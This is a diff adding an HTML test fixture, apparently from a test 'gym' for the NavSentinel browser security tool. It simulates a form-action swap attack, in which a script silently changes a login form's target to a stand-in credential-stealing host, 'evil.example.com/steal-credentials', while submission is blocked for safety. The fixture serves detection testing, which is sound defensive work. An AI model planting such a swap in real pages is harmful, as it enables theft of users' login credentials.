@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mutation 02 - Form Action Swap</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 24px;
+      max-width: 700px;
+    }
+    .description {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      padding: 12px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+    #login-form {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 24px;
+      max-width: 400px;
+    }
+    #login-form input {
+      display: block;
+      width: 100%;
+      padding: 8px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    #login-form button {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    #status {
+      margin-top: 16px;
+      padding: 12px;
+      background: #f0f0f0;
+      border-radius: 6px;
+      font-family: monospace;
+      font-size: 14px;
+    }
+    .action-display {
+      margin-top: 8px;
+      font-size: 13px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <h1>Mutation 02: Form Action Swap</h1>
+  <div class="description">
+    <strong>Attack:</strong> A login form loads with a legitimate <code>action</code>
+    attribute pointing to the real server. After the user starts typing (or after
+    a short delay), JavaScript silently changes the form action to a phishing endpoint.
+    <br><br>
+    <strong>Expected:</strong> NavSentinel's mutation monitor should detect the
+    <code>form_action_change</code> signal with <strong>high</strong> severity
+    (cross-origin change).
+  </div>
+
+  <form id="login-form" action="/api/auth/login" method="POST">
+    <h2>Sign In to Your Account</h2>
+    <label for="email">Email</label>
+    <input type="email" id="email" placeholder="you@example.com" />
+    <label for="password">Password</label>
+    <input type="password" id="password" placeholder="Password" />
+    <button type="submit">Sign In</button>
+    <div class="action-display">Form action: <code id="action-display">/api/auth/login</code></div>
+  </form>
+
+  <div id="status">Form action will be swapped in 2.5 seconds...</div>
+
+  <script>
+    (function () {
+      var form = document.getElementById("login-form");
+      var statusEl = document.getElementById("status");
+      var actionDisplay = document.getElementById("action-display");
+      var swapped = false;
+
+      setTimeout(function () {
+        if (swapped) return;
+        swapped = true;
+
+        // Silently change the form action to a phishing endpoint
+        form.setAttribute("action", "https://evil.example.com/steal-credentials");
+
+        if (actionDisplay) {
+          actionDisplay.textContent = "https://evil.example.com/steal-credentials";
+          actionDisplay.style.color = "#dc3545";
+        }
+        if (statusEl) {
+          statusEl.textContent = "Form action swapped to phishing endpoint! Check debug overlay for mutation signals.";
+          statusEl.style.background = "#f8d7da";
+        }
+      }, 2500);
+
+      // Prevent actual form submission in the gym
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
+        if (statusEl) {
+          statusEl.textContent = "Form submit blocked (gym safety). Action was: " + form.getAttribute("action");
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
